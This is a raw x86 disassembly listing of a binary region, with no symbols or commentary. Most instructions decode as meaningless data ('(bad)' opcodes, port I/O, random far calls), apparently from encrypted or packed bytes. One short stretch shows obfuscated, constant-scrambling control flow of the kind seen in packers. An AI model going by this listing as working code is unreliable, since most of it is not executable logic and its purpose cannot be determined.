  405933:	add    DWORD PTR [edx-0x35],ecx
  405936:	xchg   DWORD PTR [ecx],edi
  405938:	or     ecx,DWORD PTR ds:0x4b93554
  40593e:	push   eax
  40593f:	sbb    eax,0x5db34d3a
  405944:	in     al,dx
  405945:	mov    edx,0x414b0dfd
  40594a:	pop    ds
  40594b:	xor    DWORD PTR [ecx+0xa81488b],ecx
  405951:	(bad)  
  405953:	scas   eax,DWORD PTR es:[edi]
  405954:	daa    
  405955:	mov    ebp,DWORD PTR [ebx]
  405957:	pusha  
  405958:	imul   esi,edi,0x9
  40595b:	fstp   TBYTE PTR [eax-0x80]
  40595e:	sub    esp,DWORD PTR [eax+0x1d]
  405961:	jl     0x405952
  405963:	(bad)  
  405964:	and    eax,0xdcd02fc7
  405969:	pushf  
  40596a:	mov    BYTE PTR [eax+0x756a61a6],ch
  405970:	ss push ebx
  405972:	adc    BYTE PTR [esi],ah
  405974:	sub    ecx,ecx
  405976:	mov    ecx,0x87133939
  40597b:	popa   
  40597c:	sahf   
  40597d:	mov    ebx,0xf8544ddd
  405982:	xchg   ecx,eax
  405983:	imul   DWORD PTR [esi+0x7f]
  405986:	cmp    ebx,esp
  405988:	adc    DWORD PTR [ebx+0x3c31d572],ebx
  40598e:	mov    dl,0x80
  405990:	scas   al,BYTE PTR es:[edi]
  405991:	xchg   edx,eax
  405992:	xchg   ebx,eax
  405993:	sub    DWORD PTR [eax],edx
  405995:	fdivr  st(3),st
  405997:	jns    0x40597b
  405999:	pop    ds
  40599a:	inc    ebp
  40599b:	jmp    0xd48d72fb
  4059a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a1:	daa    
  4059a2:	adc    BYTE PTR [esi-0x4f73721e],bh
  4059a8:	fld    st(6)
  4059aa:	scas   eax,DWORD PTR es:[edi]
  4059ab:	sti    
  4059ac:	fld    QWORD PTR [edx-0x2901820b]
  4059b2:	int    0xd5
  4059b4:	hlt    
  4059b5:	lods   al,BYTE PTR ds:[esi]
  4059b6:	push   0x8d3a0b64
  4059bb:	push   0x42a230d
  4059c0:	aas    
  4059c1:	dec    eax
  4059c2:	push   esp
  4059c3:	dec    ecx
  4059c4:	xor    BYTE PTR [eax-0xa],dh
  4059c7:	out    dx,eax
  4059c8:	imul   eax,DWORD PTR [ebx],0xd3318041
  4059ce:	mov    dh,0xae
  4059d0:	jg     0x405956
  4059d2:	mov    edx,0x42e7468
  4059d7:	dec    edi
  4059d8:	xchg   edi,eax
  4059d9:	inc    eax
  4059db:	mov    ds:0xf8136b40,al
  4059e0:	and    dh,BYTE PTR [eax+0x3f]
  4059e3:	push   ebp
  4059e4:	sti    
  4059e5:	cli    
  4059e6:	mov    ds:0xe6c84ac0,al
  4059eb:	xor    al,0x2
  4059ed:	dec    ebp
  4059ee:	aam    0xf0
  4059f0:	clc    
  4059f1:	bound  esp,QWORD PTR [edi-0x6d]
  4059f4:	xchg   BYTE PTR [eax+0x3a],dh
  4059f7:	sbb    dl,BYTE PTR [edx]
  4059f9:	call   0xdb89:0xcb5922b8
  405a00:	addr16 loop 0x405a3f
  405a03:	mov    ebx,0x958b1c86
  405a08:	xchg   ebp,esi
  405a0a:	and    bh,ah
  405a0c:	in     eax,0x21
  405a0e:	xchg   ecx,eax
  405a0f:	push   esp
  405a10:	xchg   ebp,eax
  405a11:	push   ebx
  405a12:	(bad)  
  405a13:	clc    
  405a14:	loop   0x405a3c
  405a16:	sub    eax,0x2d51d6d4
  405a1b:	adc    BYTE PTR [eax+ebp*2-0x13526866],ch
  405a22:	aas    
  405a23:	call   0xa56b2917
  405a28:	es ss dec esi
  405a2b:	sbb    dl,BYTE PTR [ecx+0x2b45526f]
  405a31:	in     eax,dx
  405a32:	sub    al,0x29
  405a34:	in     eax,dx
  405a35:	cmp    al,0xab
  405a37:	js     0x405aa1
  405a39:	in     al,dx
  405a3a:	stos   DWORD PTR es:[edi],eax
  405a3b:	cmovnp ebx,ebp
  405a3e:	mov    esp,DWORD PTR [eax-0x7c]
  405a41:	mov    cl,0xc6
  405a43:	pop    ebx
  405a44:	enter  0xc4ff,0x99
  405a48:	mov    bl,0x66
  405a4a:	mov    dh,0xc2
  405a4c:	sub    dh,ch
  405a4e:	xchg   ebx,eax
  405a4f:	jg     0x405aca
  405a51:	add    al,0xde
  405a53:	stos   DWORD PTR es:[edi],eax
  405a54:	adc    eax,0x93f3df60
  405a59:	mov    esp,ecx
  405a5b:	fs loope 0x405a37
  405a5e:	enter  0x53de,0x49
  405a62:	cmovno ebp,DWORD PTR [ebx-0x3ca85393]
  405a69:	data16 add dh,BYTE PTR [ebx+0x7103d804]
  405a70:	aam    0x62
  405a72:	mov    esp,0x8250f84f
  405a77:	pop    ecx
  405a78:	lods   al,BYTE PTR ds:[esi]
  405a79:	loop   0x405a99
  405a7b:	cmovbe eax,DWORD PTR [eax]
  405a7e:	xor    BYTE PTR [eax+0x4ed882f2],bl
  405a84:	sbb    ebx,DWORD PTR [edx-0x4f]
  405a87:	vunpckhps xmm0,xmm5,xmm4
  405a8b:	(bad)  
  405a8c:	sub    dh,ah
  405a8e:	into   
  405a8f:	arpl   WORD PTR [ebp+0x758fd6dd],bp
  405a95:	mov    al,0x6f
  405a97:	je     0x405ac2
  405a99:	jne    0x405b16
  405a9b:	nop
  405a9c:	mov    ebx,0x22b88fbc
  405aa1:	cmp    eax,0x6a4d095e
  405aa6:	and    eax,eax
  405aa8:	dec    eax
  405aa9:	cs dec eax
  405aab:	std    
  405aac:	push   esi
  405aad:	push   esp
  405aae:	mov    ecx,ds
  405ab0:	mov    ebx,DWORD PTR [edx-0x426a5aa5]
  405ab6:	fiadd  WORD PTR [ebp+0x2a]
  405ab9:	fld    st(1)
  405abb:	xor    BYTE PTR [edx+0x75a38c33],ah
  405ac1:	gs ret 0xbbb1
  405ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac6:	out    dx,al
  405ac7:	pop    ebx
  405ac8:	mov    ebp,0x4b298899
  405acd:	push   ebx
  405ace:	and    al,0x5e
  405ad0:	fs (bad) 
  405ad3:	mov    ecx,0x41ce838d
  405ad8:	mov    ebx,0x3ae1db2c
  405add:	or     DWORD PTR [ebx],esp
  405adf:	cmp    eax,0xdba0acbf
  405ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ae5:	mov    esp,edi
  405ae7:	push   esp
  405ae8:	rcr    DWORD PTR [eax+0x6822fde1],cl
  405aee:	fisubr WORD PTR [ebx-0x2e7e33ab]
  405af4:	jl     0x405ab6
  405af6:	outs   dx,DWORD PTR ds:[esi]
  405af7:	gs inc ecx
  405af9:	retf   
  405afa:	mov    ds:0x78adf542,al
  405aff:	mov    WORD PTR [ecx],?
  405b01:	push   ds
  405b02:	dec    ecx
  405b03:	push   ss
  405b04:	mov    ch,0xb6
  405b06:	imul   ecx,DWORD PTR [ebp-0x23e64830],0xffffffc6
  405b0d:	test   edx,edx
  405b0f:	aam    0x7
  405b11:	shl    esp,cl
  405b13:	dec    edx
  405b14:	sti    
  405b15:	enter  0xad87,0x9f
  405b19:	mov    ebx,0x43924b7d
  405b1e:	dec    edx
  405b1f:	int3   
  405b20:	ins    DWORD PTR es:[edi],dx
  405b21:	ins    BYTE PTR es:[edi],dx
  405b22:	pushf  
  405b23:	xor    edi,esi
  405b25:	cmp    eax,0x7af12d6
  405b2a:	mov    edi,0xd46895cd
  405b2f:	xlat   BYTE PTR ds:[ebx]
  405b30:	xor    al,0xd5
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43381b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4337d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433823,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43386f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4338af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xf700f63c
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c4e
  405be0:	cs neg bh
  405be3:	(bad)  
  405be4:	rcr    DWORD PTR ds:0xa520c832,1
  405bea:	adc    BYTE PTR [esi],0x68
  405bed:	dec    esi
  405bee:	fsub   QWORD PTR [edx+0x4970232a]
  405bf4:	data16 loope 0x405bef
  405bf7:	jb     0x405b7a
  405bf9:	popf   
  405bfa:	addr16 nop
  405bfc:	out    dx,eax
  405bfd:	call   0xc647d748
  405c02:	shl    DWORD PTR [ebx+0x6e046975],cl
  405c08:	mov    gs,WORD PTR [ebx]
  405c0a:	in     eax,0x8c
  405c0c:	jl     0x405c2b
  405c0e:	arpl   WORD PTR [ebx+edx*2-0x10],si
  405c12:	jnp    0x405c28
  405c14:	lods   al,BYTE PTR ds:[esi]
  405c15:	xchg   edi,eax
  405c16:	lock lea ebx,[ecx]
  405c19:	aaa    
  405c1a:	addr16 enter 0xed79,0x46
  405c1f:	(bad)  
  405c20:	mov    esp,0xe3b784d4
  405c25:	mov    edx,0x46d44117
  405c2a:	dec    edx
  405c2b:	push   cs
  405c2c:	jbe    0x405c6a
  405c2e:	xor    al,dl
  405c30:	xor    al,0x44
  405c32:	sbb    al,BYTE PTR [ebp+eax*2+0x34]
  405c36:	inc    eax
  405c37:	push   ds
  405c38:	mov    edi,0x874c0f05
  405c3d:	sti    
  405c3e:	(bad)  
  405c3f:	fbld   TBYTE PTR [eax+edi*1+0x6d]
  405c43:	add    dh,BYTE PTR [ebp-0x3161bad4]
  405c49:	xchg   ebp,eax
  405c4a:	ficomp DWORD PTR [ecx-0x5ba235ae]
  405c50:	mov    bl,0xb2
  405c52:	das    
  405c53:	aas    
  405c54:	mov    ds:0xc6fd00ab,al
  405c59:	push   ebp
  405c5a:	aas    
  405c5b:	push   ebx
  405c5c:	cli    
  405c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c5e:	push   ebp
  405c5f:	add    edi,0x1c
  405c62:	push   esp
  405c63:	pushf  
  405c64:	mov    ds:0x2729e051,eax
  405c69:	xchg   ecx,edi
  405c6b:	xor    eax,0x1c15f6ee
  405c70:	xor    edi,DWORD PTR [edi+0x1b]
  405c73:	cmc    
  405c74:	fsub   st,st(2)
  405c76:	enter  0x44dd,0x22
  405c7a:	shr    BYTE PTR [ecx],1
  405c7c:	mov    eax,0xcc57f726
  405c81:	dec    ebp
  405c82:	cwde   
  405c83:	mov    eax,0x1b29a5f5
  405c88:	push   ss
  405c89:	mov    cx,0x5eff
  405c8d:	in     al,0x54
  405c8f:	lds    esp,FWORD PTR [esp+edi*1-0x416d1e33]
  405c96:	rcr    DWORD PTR [ecx-0x6c],1
  405c99:	jne    0x405caa
  405c9b:	(bad)  
  405c9c:	fimul  WORD PTR [edi-0x3d9fcfc1]
  405ca2:	and    esp,DWORD PTR [eax+0x7b]
  405ca5:	pop    ebp
  405ca6:	in     eax,dx
  405ca7:	scas   al,BYTE PTR es:[edi]
  405ca8:	or     BYTE PTR [esi+eiz*8-0x7e],ch
  405cac:	xchg   edi,eax
  405cad:	dec    eax
  405cae:	push   0xb3df44d8
  405cb3:	out    dx,al
  405cb4:	xchg   ebp,eax
  405cb5:	sahf   
  405cb6:	mov    ch,0xa0
  405cb8:	idiv   DWORD PTR [edi]
  405cba:	cli    
  405cbb:	fist   DWORD PTR [ebx+0x5f]
  405cbe:	imul   ebp,DWORD PTR [eax-0x3b],0x44f1f667
  405cc5:	mov    eax,0xb9569eea
  405cca:	add    BYTE PTR [ebp+esi*2-0x44c20158],0xa2
  405cd2:	lahf   
  405cd3:	hlt    
  405cd4:	imul   esp,eax,0xffffffb7
  405cd7:	sbb    eax,0xf9334a35
  405cdc:	aaa    
  405cdd:	scas   al,BYTE PTR es:[edi]
  405cde:	enter  0xd747,0x9c
  405ce2:	enter  0x31d0,0xd
  405ce6:	or     ch,bh
  405ce8:	mov    DWORD PTR [edx-0x4c467e2],esp
  405cee:	(bad)  [esi-0x18b9445a]
  405cf4:	sub    eax,0x9cfc8354
  405cf9:	or     edi,DWORD PTR [ecx+edx*8]
  405cfc:	fwait
  405cfd:	repnz mov ah,BYTE PTR [ebx-0x26b7ccf2]
  405d04:	and    BYTE PTR [ecx+eax*8],dh
  405d07:	dec    edi
  405d08:	leave  
  405d09:	and    eax,0x903e07ad
  405d0e:	pop    ebp
  405d0f:	mov    bl,BYTE PTR [edx+0x2719fba3]
  405d15:	dec    esi
  405d16:	test   DWORD PTR [edx-0x17],0x3b6274ab
  405d1d:	mov    cl,0x25
  405d1f:	je     0x405ceb
  405d21:	in     al,0x4d
  405d23:	(bad)  
  405d24:	jmp    0x53e84190
  405d29:	mov    DWORD PTR [ebp+0x5b79a835],eax
  405d2f:	inc    DWORD PTR [ecx+0x27598e56]
  405d35:	xchg   DWORD PTR [esi-0x1825c5b9],esp
  405d3b:	in     eax,0x17
  405d3d:	dec    edx
  405d3e:	sbb    al,0xde
  405d40:	add    BYTE PTR [ecx-0x6888b063],dh
  405d46:	(bad)  
  405d47:	fcomp  DWORD PTR es:[edi+0x11]
  405d4b:	cld    
  405d4c:	popf   
  405d4d:	xlat   BYTE PTR ds:[ebx]
  405d4e:	or     DWORD PTR [edx-0x68],ebp
  405d51:	cmc    
  405d52:	xor    al,0x9b
  405d54:	cmc    
  405d55:	mov    ebx,0x76980d94
  405d5a:	mov    cl,0xc0
  405d5c:	xchg   ecx,eax
  405d5d:	cmp    al,0x3f
  405d5f:	mov    esp,0xdebd25b7
  405d64:	pop    ss
  405d65:	adc    ch,BYTE PTR [ebx+edx*1+0x2636f946]
  405d6c:	test   eax,0xbd7b939f
  405d71:	xchg   ecx,eax
  405d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d73:	outs   dx,DWORD PTR ds:[esi]
  405d74:	jg     0x405d98
  405d76:	jnp    0x405d3d
  405d78:	mov    dh,0x83
  405d7a:	jb     0x405d85
  405d7c:	push   ss
  405d7d:	xor    eax,DWORD PTR [edx+eiz*8+0x6f]
  405d81:	fwait
  405d82:	and    esi,DWORD PTR [esi-0x16f09496]
  405d88:	test   al,0x23
  405d8a:	popa   
  405d8b:	retf   
  405d8c:	pusha  
  405d8d:	das    
  405d8e:	pushf  
  405d8f:	pop    edi
  405d90:	mov    ch,0xea
  405d92:	shr    BYTE PTR [eax],cl
  405d94:	jg     0x405dc5
  405d96:	pushf  
  405d97:	in     eax,0x0
  405d99:	or     ebp,ebx
  405d9b:	or     DWORD PTR [ebx+0x40],eax
  405d9e:	mov    bh,0xd
  405da0:	jmp    0x405d28
  405da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405da3:	data16 jg 0x405de4
  405da6:	xchg   ecx,eax
  405da7:	add    cl,cl
  405da9:	push   ds
  405daa:	and    eax,ecx
  405dac:	aas    
  405dad:	leavew 
  405daf:	retf   
  405db0:	aaa    
  405db1:	pop    ecx
  405db2:	enter  0x3d84,0x2a
  405db6:	scas   eax,DWORD PTR es:[edi]
  405db7:	xchg   BYTE PTR [esi-0x2f49c33a],bh
  405dbd:	push   ecx
  405dbe:	or     BYTE PTR [ecx+0x5e3a27b6],dl
  405dc4:	add    DWORD PTR [edx],edx
  405dc6:	loope  0x405dfa
  405dc8:	inc    edi
  405dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dca:	and    al,0x2e
  405dcc:	test   bh,cl
  405dce:	outs   dx,DWORD PTR ds:[esi]
  405dcf:	pop    edx
  405dd0:	sahf   
  405dd1:	pop    ss
  405dd2:	ror    DWORD PTR [edi],cl
  405dd4:	lahf   
  405dd5:	push   esi
  405dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dd7:	call   0x6536:0x61747984
  405dde:	lods   al,BYTE PTR ds:[esi]
  405ddf:	fadd   DWORD PTR [edi+0x27]
  405de2:	and    eax,0x54612627
  405de7:	xchg   esp,eax
  405de8:	or     edx,DWORD PTR [ecx-0x6657edca]
  405dee:	inc    ebp
  405def:	fadd   DWORD PTR [ebp+0x30]
  405df2:	add    DWORD PTR [ebp+0x43],edx
  405df5:	leave  
  405df6:	mov    eax,ds:0xabef2deb
  405dfb:	test   BYTE PTR [esi],ah
  405dfd:	xor    al,0xa6
  405dff:	xor    cl,BYTE PTR [ebx]
  405e01:	stos   BYTE PTR es:[edi],al
  405e02:	jecxz  0x405d85
  405e04:	and    eax,0xfdd53311
  405e09:	or     eax,DWORD PTR [esp+eax*4+0x66]
  405e0d:	mov    edx,0x2efbc7bf
  405e12:	pop    esp
  405e13:	dec    edi
  405e14:	(bad)  
  405e16:	dec    esp
  405e17:	imul   BYTE PTR es:[eax+0x1d]
  405e1b:	hlt    
  405e1c:	sbb    ah,cl
  405e1e:	int    0x47
  405e20:	ja     0x405dc9
  405e22:	jg     0x405e72
  405e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e25:	pop    ecx
  405e26:	jb     0x405dc2
  405e28:	out    dx,al
  405e29:	in     eax,0xd0
  405e2b:	icebp  
  405e2c:	inc    eax
  405e2d:	xor    ebx,ecx
  405e2f:	adc    ch,dh
  405e31:	jle    0x405e12
  405e33:	dec    ebx
  405e34:	and    BYTE PTR [esp+edi*1+0x4a116360],dl
  405e3b:	jge    0x405dc1
  405e3d:	int    0x6d
  405e3f:	and    BYTE PTR [esp+eax*2],bl
  405e42:	enter  0x3125,0xe9
  405e46:	push   ss
  405e47:	dec    ebx
  405e48:	xchg   BYTE PTR [eax],cl
  405e4a:	ja     0x405ddc
  405e4c:	sahf   
  405e4d:	pop    edi
  405e4e:	fild   QWORD PTR [ebp-0x51e7fc1f]
  405e54:	xor    BYTE PTR [edx+0x42636d65],bl
  405e5a:	adc    BYTE PTR [edx+0x5e],0xa1
  405e5e:	jo     0x405e50
  405e60:	push   ecx
  405e61:	mov    ds:0x903bfa4c,al
  405e66:	lods   eax,DWORD PTR ds:[esi]
  405e67:	add    dl,BYTE PTR [esi-0x2ae6ea63]
  405e6d:	(bad)  
  405e6e:	pop    edx
  405e6f:	ins    DWORD PTR es:[edi],dx
  405e70:	cwde   
  405e71:	jo     0x405e5d
  405e73:	cmp    al,0x54
  405e75:	fs xchg esp,eax
  405e77:	(bad)  
  405e78:	and    BYTE PTR [edi],ah
  405e7a:	ins    BYTE PTR es:[edi],dx
  405e7b:	outs   dx,DWORD PTR ds:[esi]
  405e7c:	into   
  405e7d:	nop
  405e7e:	push   ebx
  405e7f:	xor    BYTE PTR [edx-0x62],al
  405e82:	into   
  405e83:	nop
  405e84:	dec    ebp
  405e85:	cli    
  405e86:	jge    0x405e86
  405e88:	mov    esp,0xebf7cbb4
  405e8d:	repz cmp bh,bh
  405e90:	jmp    0x405e2e
  405e92:	stc    
  405e93:	and    eax,DWORD PTR [edx]
  405e95:	xchg   ebp,eax
  405e96:	xchg   ebp,eax
  405e97:	aaa    
  405e98:	dec    ebp
  405e99:	inc    esp
  405e9a:	int    0x31
  405e9c:	lahf   
  405e9d:	push   eax
  405e9e:	and    bl,ah
  405ea0:	mov    esp,0xd37281ee
  405ea5:	dec    eax
  405ea6:	jl     0x405e31
  405ea8:	rcl    DWORD PTR ds:[edi-0x3dbe3a69],cl
  405eaf:	div    BYTE PTR [edx]
  405eb1:	pop    eax
  405eb2:	dec    edx
  405eb3:	jbe    0x405efd
  405eb5:	mov    dh,0xf6
  405eb7:	xor    ecx,DWORD PTR [ecx]
  405eb9:	mov    edx,0xee4c943a
  405ebe:	push   esi
  405ebf:	call   0x216e:0x4a3c82a0
  405ec6:	adc    al,0x74
  405ec8:	outs   dx,DWORD PTR ds:[esi]
  405ec9:	call   0x5540081a
  405ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ecf:	add    al,0x59
  405ed1:	push   edx
  405ed2:	cmp    cl,ah
  405ed4:	test   BYTE PTR [ebp+0x5c],ch
  405ed7:	pop    ebp
  405ed8:	loopne 0x405eaa
  405eda:	jecxz  0x405eb5
  405edc:	jg     0x405f20
  405ede:	cmp    BYTE PTR [edi+0xec44791],bh
  405ee4:	mov    eax,0xccbd0a0e
  405ee9:	iret   
  405eea:	test   dh,ch
  405eec:	pop    eax
  405eed:	test   BYTE PTR [ecx+0x35cd3eb2],ch
  405ef3:	popf   
  405ef4:	(bad)  
  405ef5:	in     eax,dx
  405ef6:	add    BYTE PTR [ecx+0x2d451afe],ch
  405efc:	in     eax,dx
  405efd:	jbe    0x405f28
  405eff:	(bad)  
  405f00:	shr    cl,cl
  405f02:	dec    ecx
  405f03:	mov    DWORD PTR [ecx],ebp
  405f05:	dec    ebx
  405f06:	dec    ecx
  405f07:	in     al,dx
  405f08:	leave  
  405f09:	loop   0x405ea8
  405f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f0c:	mov    al,0xf4
  405f0e:	scas   eax,DWORD PTR es:[edi]
  405f0f:	dec    edx
  405f10:	mov    dh,BYTE PTR [ebx]
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [esi+0x3b],?
  405f28:	or     BYTE PTR es:[esi+0x2c7e7e30],ah
  405f2f:	jge    0x405faf
  405f31:	jle    0x405ef8
  405f33:	xlat   BYTE PTR ds:[ebx]
  405f34:	repz in al,dx
  405f36:	pop    edi
  405f37:	and    bl,ah
  405f39:	ret    
  405f3a:	sahf   
  405f3b:	(bad)  [edx+0x29439893]
  405f41:	push   es
  405f42:	pop    esp
  405f43:	outs   dx,BYTE PTR ds:[esi]
  405f44:	sbb    bh,BYTE PTR [ecx]
  405f46:	inc    eax
  405f47:	or     al,0x83
  405f49:	mov    ds,WORD PTR [ecx]
  405f4b:	add    esi,ebp
  405f4d:	jecxz  0x405eeb
  405f4f:	xchg   ebx,eax
  405f50:	cs jecxz 0x405fcb
  405f53:	cmp    cl,BYTE PTR [edi-0x44caf7a6]
  405f59:	mov    esi,0x16a57463
  405f5e:	and    edx,ebp
  405f60:	mov    esp,fs
  405f62:	and    BYTE PTR [ecx],bl
  405f64:	mov    ds:0x2d6d5408,al
  405f69:	imul   eax,DWORD PTR [ebx-0x53],0x5f61ee03
  405f70:	cmp    dh,BYTE PTR [edx-0x59]
  405f73:	stos   BYTE PTR es:[edi],al
  405f74:	dec    eax
  405f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f76:	(bad)  
  405f77:	and    al,0xcd
  405f79:	outs   dx,DWORD PTR ds:[esi]
  405f7a:	shr    BYTE PTR [ebx-0x7a07afbe],0x9e
  405f81:	adc    DWORD PTR [edx],ebx
  405f83:	ja     0x405f8c
  405f85:	lahf   
  405f86:	adc    BYTE PTR [ecx+eax*2-0x13],al
  405f8a:	rcr    BYTE PTR [edi-0x660afdc4],cl
  405f90:	ret    
  405f91:	push   edx
  405f92:	push   ecx
  405f93:	test   DWORD PTR [ecx+0x27b6b864],ecx
  405f99:	xor    al,0xaf
  405f9b:	add    bl,BYTE PTR [eax+0x67]
  405f9e:	adc    al,0xd3
  405fa0:	inc    eax
  405fa1:	in     al,0xf4
  405fa3:	imul   eax,DWORD PTR ds:[ecx-0x6e],0xffffffde
  405fa8:	mov    ch,0x24
  405faa:	enter  0x73e2,0xce
  405fae:	sti    
  405faf:	dec    ebp
  405fb0:	into   
  405fb1:	inc    eax
  405fb2:	lods   al,BYTE PTR ds:[esi]
  405fb3:	push   ebx
  405fb4:	sub    al,0x27
  405fb6:	push   ecx
  405fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb8:	or     al,ah
  405fba:	clc    
  405fbb:	mov    cl,0x33
  405fbd:	xchg   ebp,eax
  405fbe:	push   ss
  405fbf:	ja     0x405f42
  405fc1:	fstp   QWORD PTR [ecx-0x48]
  405fc4:	mov    eax,0xfecf0626
  405fc9:	sti    
  405fca:	sti    
  405fcb:	shl    edi,1
  405fcd:	fchs   
  405fcf:	imul   ebp,DWORD PTR [esi-0x49d496b8],0xeb83869d
  405fd9:	leave  
  405fda:	daa    
  405fdb:	mov    ?,edi
  405fdd:	fmul   DWORD PTR [edi+ecx*4]
  405fe0:	fnstenv [edx-0x14]
  405fe3:	push   es
  405fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fe5:	call   0xb305d5f6
  405fea:	ror    BYTE PTR [edi+0x48aad1a0],1
  405ff0:	inc    ebp
  405ff1:	call   0x6f47b648
  405ff6:	imul   DWORD PTR [ecx-0x2a]
  405ff9:	shl    DWORD PTR [ebx],1
  405ffb:	mov    ds:0xfc06af34,al
  406000:	mov    ds:0xd8312928,al
  406005:	nop
  406006:	jae    0x405fe2
  406008:	fldcw  WORD PTR [esi-0x35aa0afa]
  40600e:	stos   DWORD PTR es:[edi],eax
  40600f:	jo     0x406012
  406011:	dec    edi
  406012:	imul   eax,esp,0xffffff8f
  406015:	sbb    esp,esp
  406017:	jne    0x405fbe
  406019:	fld    DWORD PTR [ecx+ebp*8-0x4a08104e]
  406020:	jg     0x405fe1
  406022:	mov    ds:0x12584f5e,eax
  406027:	jo     0x405fbc
  406029:	push   edi
  40602a:	out    0x37,al
  40602c:	ins    DWORD PTR es:[edi],dx
  40602d:	pop    edx
  40602e:	push   ss
  40602f:	in     al,dx
  406030:	xchg   bx,ax
  406032:	stos   DWORD PTR es:[edi],eax
  406033:	pushf  
  406034:	xchg   esp,eax
  406035:	xchg   esp,eax
  406036:	int3   
  406037:	nop
  406038:	retf   
  406039:	cmp    ch,BYTE PTR [ecx+0x57b977c0]
  40603f:	or     BYTE PTR [edi+ebp*1-0x6f],dh
  406043:	mov    ds:0x7479e02d,al
  406048:	sub    al,BYTE PTR [esi+0x3422d8af]
  40604e:	or     DWORD PTR [edx-0x1a375331],ebp
  406054:	sub    esp,DWORD PTR [edi-0x68]
  406057:	jle    0x40602f
  406059:	retf   0x717d
  40605c:	imul   edi,DWORD PTR [ebx-0x11],0xd2684f61
  406063:	outs   dx,BYTE PTR ds:[esi]
  406064:	jbe    0x4060aa
  406066:	sbb    eax,0xeba3cb74
  40606b:	imul   esp,esi,0xd69a7513
  406071:	pop    eax
  406072:	cwde   
  406073:	je     0x406025
  406075:	pop    ecx
  406076:	inc    esp
  406077:	mov    esp,0xe3e3034
  40607c:	or     cl,BYTE PTR [edx]
  40607e:	cmp    eax,0xd24516f1
  406083:	push   es
  406084:	loop   0x40600c
  406086:	popa   
  406087:	mov    edx,esp
  406089:	imul   ecx,DWORD PTR [eax],0xfffffffd
  40608c:	cwde   
  40608d:	xor    DWORD PTR [ebx],ecx
  40608f:	scas   al,BYTE PTR es:[edi]
  406090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406091:	xchg   DWORD PTR [ebx],edx
  406093:	and    bl,0xf6
  406096:	pop    ebp
  406097:	adc    edi,DWORD PTR [esi+0x35]
  40609a:	jae    0x4060ab
  40609c:	add    DWORD PTR [eax-0x15],0x71
  4060a0:	mov    esi,0xec29a47b
  4060a5:	jl     0x406079
  4060a7:	cdq    
  4060a8:	scas   eax,DWORD PTR es:[edi]
  4060a9:	sbb    dh,dh
  4060ab:	jnp    0x406113
  4060ad:	inc    edi
  4060ae:	xchg   DWORD PTR [eax+0x4150a21e],ecx
  4060b4:	mov    ebx,ebx
  4060b6:	dec    eax
  4060b7:	or     DWORD PTR [ebx-0x48],esi
  4060ba:	in     eax,0xcb
  4060bc:	or     ah,BYTE PTR [eax+ebx*1+0x32]
  4060c0:	push   eax
  4060c1:	and    al,0x3e
  4060c3:	sub    al,0x9e
  4060c5:	adc    edi,edi
  4060c7:	ds (bad) 
  4060c9:	(bad)  
  4060ca:	jmp    DWORD PTR [edx]
  4060cc:	jns    0x406109
  4060ce:	mov    al,0xc5
  4060d0:	ja     0x406132
  4060d2:	cli    
  4060d3:	inc    edx
  4060d4:	jne    0x406072
  4060d6:	push   esp
  4060d7:	scas   al,BYTE PTR es:[edi]
  4060d8:	gs jmp 0x4060bd
  4060db:	fidivr DWORD PTR [esi]
  4060dd:	mov    edx,0x59909a33
  4060e2:	xchg   edx,eax
  4060e3:	les    ecx,FWORD PTR [ebp-0x21]
  4060e6:	cmp    BYTE PTR [edx-0x6122b63c],ch
  4060ec:	add    al,0x8b
  4060ee:	das    
  4060ef:	dec    esp
  4060f0:	leave  
  4060f1:	cmp    eax,0xcad24f2c
  4060f6:	inc    edx
  4060f8:	out    dx,eax
  4060f9:	mov    eax,ds:0x574ed164
